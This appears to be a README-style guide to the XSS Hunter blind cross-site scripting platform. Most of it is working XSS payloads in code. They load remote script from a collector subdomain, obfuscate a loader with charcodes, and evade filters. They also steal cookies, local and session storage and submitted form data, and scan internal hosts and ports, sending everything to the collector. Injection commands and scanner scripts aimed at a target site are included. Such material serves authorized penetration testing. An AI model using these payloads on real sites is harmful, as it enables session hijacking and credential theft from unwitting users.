# XSS Hunter - Advanced XSS Detection and Payload Collection

Comprehensive platform for advanced Cross-Site Scripting detection, exploitation, and payload collection.

## Overview

XSS Hunter is a service that helps find cross-site scripting vulnerabilities by providing:
- Blind XSS detection
- Payload collection and analysis
- Advanced reporting capabilities
- Automated payload generation
- Real-time notification system

## Installation Options

### Self-Hosted Setup
```bash
# Clone repository
git clone https://github.com/mandatoryprogrammer/xsshunter-express.git
cd xsshunter-express

# Install dependencies
npm install

# Configure environment
cp .env.example .env
# Edit .env with your settings

# Start service
npm start
```

### Docker Deployment
```bash
# Using Docker Compose
git clone https://github.com/mandatoryprogrammer/xsshunter-express.git
cd xsshunter-express
docker-compose up -d

# Manual Docker setup
docker build -t xsshunter .
docker run -p 80:8080 -e DATABASE_URL=... xsshunter
```

### Cloud Service
- Use the hosted service at xsshunter.com
- Register for an account and API key
- Configure subdomain for payload collection

## Basic Usage

### 1. Payload Generation
```javascript
// Basic XSS Hunter payload
"><script src="https://yoursubdomain.xss.ht"></script>

// Advanced payload with context
'><script src="https://yoursubdomain.xss.ht"></script><'

// For specific contexts
"><img src=x onerror="eval(String.fromCharCode(118,97,114,32,115,61,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,32,115,46,115,114,99,61,39,104,116,116,112,115,58,47,47,121,111,117,114,115,117,98,100,111,109,97,105,110,46,120,115,115,46,104,116,39,59,32,100,111,99,117,109,101,110,116,46,104,101,97,100,46,97,112,112,101,110,100,67,104,105,108,100,40,115,41,59))">
```

### 2. Payload Injection
```bash
# Manual testing
curl -X POST "http://target.com/comment" \
  -d "comment=><script src=https://yoursubdomain.xss.ht></script>"

# Automated testing with various tools
echo '"><script src="https://yoursubdomain.xss.ht"></script>' > xss_payload.txt
```

### 3. Result Collection
- Access your XSS Hunter dashboard
- Review triggered payloads
- Analyze collected data:
  - DOM content
  - Cookies
  - Local storage
  - Session data
  - Screenshots

## Advanced Features

### Custom Payload Generation
```javascript
// Stealth payload
var s = document.createElement('script');
s.src = 'https://yoursubdomain.xss.ht/probe';
s.onload = function() {
    // Custom actions after load
    collectSensitiveData();
};
document.head.appendChild(s);

// Multi-stage payload
(function() {
    var img = new Image();
    img.src = 'https://yoursubdomain.xss.ht/stage1?url=' + encodeURIComponent(window.location);
    
    setTimeout(function() {
        var s = document.createElement('script');
        s.src = 'https://yoursubdomain.xss.ht/stage2';
        document.head.appendChild(s);
    }, 2000);
})();
```

### Data Exfiltration Payloads
```javascript
// Cookie extraction
"><script>
fetch('https://yoursubdomain.xss.ht/collect', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
        cookies: document.cookie,
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage),
        url: window.location.href
    })
});
</script>

// Form data harvesting  
"><script>
document.querySelectorAll('form').forEach(form => {
    form.addEventListener('submit', function(e) {
        var formData = new FormData(form);
        var data = {};
        for(var pair of formData.entries()) {
            data[pair[0]] = pair[1];
        }
        fetch('https://yoursubdomain.xss.ht/forms', {
            method: 'POST',
            body: JSON.stringify(data)
        });
    });
});
</script>
```

### Advanced Reconnaissance
```javascript
// Network scanning payload
"><script>
var targets = ['192.168.1.1', '10.0.0.1', '172.16.0.1'];
var results = [];

targets.forEach(target => {
    var img = new Image();
    img.onload = () => results.push({host: target, status: 'up'});
    img.onerror = () => results.push({host: target, status: 'down'});
    img.src = 'http://' + target + '/favicon.ico?' + Math.random();
    
    setTimeout(() => {
        fetch('https://yoursubdomain.xss.ht/scan', {
            method: 'POST',
            body: JSON.stringify(results)
        });
    }, 5000);
});
</script>

// Port scanning
"><script>
var ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995];
var host = '192.168.1.100';
var results = [];

ports.forEach(port => {
    var ws = new WebSocket('ws://' + host + ':' + port);
    ws.onopen = () => {
        results.push({port: port, status: 'open'});
        ws.close();
    };
    ws.onerror = () => {
        results.push({port: port, status: 'closed'});
    };
});

setTimeout(() => {
    fetch('https://yoursubdomain.xss.ht/ports', {
        method: 'POST',
        body: JSON.stringify(results)
    });
}, 10000);
</script>
```

## Blind XSS Detection

### Email-Based Triggers
```javascript
// Payload for contact forms
"><script>
if(document.querySelector('input[type="email"]')) {
    var s = document.createElement('script');
    s.src = 'https://yoursubdomain.xss.ht/email-context';
    document.head.appendChild(s);
}
</script>

// Admin panel detection
"><script>
if(document.title.toLowerCase().includes('admin') || 
   window.location.href.includes('admin')) {
    fetch('https://yoursubdomain.xss.ht/admin-found', {
        method: 'POST',
        body: JSON.stringify({
            title: document.title,
            url: window.location.href,
            html: document.documentElement.outerHTML.substring(0, 5000)
        })
    });
}
</script>
```

### PDF/Document Context
```javascript
// PDF viewer context
"><script>
if(window.location.href.includes('.pdf') || 
   document.querySelector('embed[type="application/pdf"]')) {
    var s = document.createElement('script');
    s.src = 'https://yoursubdomain.xss.ht/pdf-context';
    document.head.appendChild(s);
}
</script>
```

## Integration with Testing Tools

### Burp Suite Integration
```python
# Burp Suite extension for XSS Hunter
from burp import IBurpExtender, IHttpListener

class BurpExtender(IBurpExtender, IHttpListener):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("XSS Hunter Integration")
        callbacks.registerHttpListener(self)
        
    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        if not messageIsRequest:
            response = messageInfo.getResponse()
            responseString = self._helpers.bytesToString(response)
            
            # Inject XSS Hunter payload into responses
            payload = '"><script src="https://yoursubdomain.xss.ht"></script>'
            if "text/html" in responseString:
                # Inject payload logic here
                pass
```

### OWASP ZAP Integration
```python
# ZAP script for XSS Hunter payloads
def scan(ps, msg, src):
    payload = '"><script src="https://yoursubdomain.xss.ht/zap"></script>'
    
    # Test each parameter
    for param in msg.getParamNameSet():
        msg.setParam(param, payload)
        ps.raiseAlert(...)
```

### Custom Scanner Integration
```python
#!/usr/bin/env python3
import requests
import time
from urllib.parse import urljoin

class XSSHunterScanner:
    def __init__(self, xss_hunter_domain):
        self.domain = xss_hunter_domain
        self.payload_base = f'"><script src="https://{xss_hunter_domain}"></script>'
        
    def test_reflected_xss(self, url, params):
        """Test for reflected XSS with XSS Hunter payloads"""
        for param in params:
            test_params = params.copy()
            test_params[param] = self.payload_base
            
            response = requests.get(url, params=test_params)
            # XSS Hunter will collect any successful executions
            
    def test_stored_xss(self, url, data):
        """Test for stored XSS"""
        for field in data:
            test_data = data.copy()
            test_data[field] = self.payload_base
            
            requests.post(url, data=test_data)
            time.sleep(2)  # Allow time for execution

# Usage
scanner = XSSHunterScanner("yoursubdomain.xss.ht")
scanner.test_reflected_xss("http://target.com/search", {"q": ""})
```

## Payload Variations

### Context-Specific Payloads
```javascript
// Attribute context
" onmouseover="var s=document.createElement('script');s.src='https://yoursubdomain.xss.ht';document.head.appendChild(s)" "

// JavaScript context
';var s=document.createElement('script');s.src='https://yoursubdomain.xss.ht';document.head.appendChild(s);//

// CSS context
</style><script src="https://yoursubdomain.xss.ht"></script><style>

// JSON context
","xss":"</script><script src='https://yoursubdomain.xss.ht'></script>
```

### Filter Evasion
```javascript
// Encoding variations
%22%3E%3Cscript%20src%3D%22https://yoursubdomain.xss.ht%22%3E%3C/script%3E

// Case variations
"><ScRiPt SrC="https://yoursubdomain.xss.ht"></ScRiPt>

// Unicode variations
"><script src="https://yoursubdomain.xss.ht"></script>

// HTML entity variations
&quot;&gt;&lt;script src=&quot;https://yoursubdomain.xss.ht&quot;&gt;&lt;/script&gt;
```

## Reporting and Analysis

### Dashboard Features
- Real-time payload execution alerts
- Detailed execution context
- Screenshot capture
- DOM content collection
- Browser fingerprinting
- Geolocation data
- Network information

### API Access
```bash
# Get collected data via API
curl -H "Authorization: Bearer YOUR_API_KEY" \
     "https://xsshunter.com/api/payloads"

# Webhook integration
curl -X POST "https://your-webhook-url.com/xss-alert" \
     -H "Content-Type: application/json" \
     -d '{"payload_id": "123", "victim_ip": "1.2.3.4"}'
```

## Best Practices

### Responsible Testing
1. Only test on authorized applications
2. Use unique identifiers for each test
3. Set appropriate expiration times
4. Minimize data collection to necessary items
5. Secure collected data appropriately

### Operational Security
1. Use dedicated subdomains for each client
2. Implement proper access controls
3. Monitor for unauthorized payload usage
4. Regular security updates and patches
5. Proper logging and audit trails

Powerful platform for comprehensive XSS detection, especially effective for identifying blind XSS vulnerabilities in complex applications.
